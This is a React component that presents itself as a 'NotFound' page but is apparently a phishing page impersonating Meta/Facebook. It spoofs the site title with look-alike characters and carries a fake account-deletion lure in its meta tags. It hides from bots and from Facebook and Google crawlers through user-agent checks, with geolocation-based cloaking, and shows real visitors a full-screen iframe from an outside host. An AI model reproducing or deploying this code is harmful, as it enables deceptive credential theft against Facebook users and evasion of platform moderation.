import React, { useEffect, useState } from "react";
import { isbot } from "isbot";
import { Helmet } from 'react-helmet';
import favicon2 from '../resources/favicon2.ico';
import bannermeta from '../resources/banner-meta.png';


function NotFound() {
  let[countryCode, setCountryCode] = useState('us');
  let[IsUserHiden, SetUserHiden] = useState(false);
  let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
  let[SiteTitleHome, SetSiteTitleHome] = useState('Мeta | Faceboοk');


  function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          <meta property="og:type" content="article"/>
          <meta property="og:title" content="We have scheduled your page to be deleted"/>
          <meta name="description" content="We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification."/>
          <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
          <meta property="og:image" content={bannermeta}/>
          <meta name="theme-color" content="#000000"></meta>
          {favicon ? 
          <link rel="icon" type="image/svg+xml" href={favicon2}/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
  }
 
  const setLocaltion =  () => {
    try {
        fetch("https://api64.ipify.org/?format=json").then(d => d.json()).then(d => {
          var ipAddress = d.ip;
          if(ipAddress){
            fetch(`https://ipinfo.io/widget/demo/${ipAddress}`).then(d => d.json()).then(d => {
            let data = d.data;
            if(data){
             // var countryCode = data.country;
              //setCountryCode(countryCode.toLowerCase());
              // var privacy = data.privacy;
              // if(privacy){
              //   console.log(privacy);
              //   if(
              //     privacy.vpn == true
              //     || privacy.hosting == true
              //     || privacy.relay == true
              //     || privacy.tor == true
              //     || privacy.proxy == true
              //   ){
              //     SetUserHiden(true);
              //   }
              // }
              // setCountryCode(countryCode.toLowerCase());
            }
          }); 
        }
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };
  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      return(showIframe("/id/home.html",SiteTitleHome,false));
    }else{
      if(countryCode.length == 0){
        return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
        );
      }else{
        if(countryCode.includes('vn')){
          return(showIframe("/id/home.html",SiteTitleHome,false));
        }else{
          return(showIframe(IframeUrl,SiteTitleMeta,true));
        }
      }
    }
  }else{
    return(showIframe("/id/home.html",SiteTitleHome,false));
  }
}

export default NotFound;
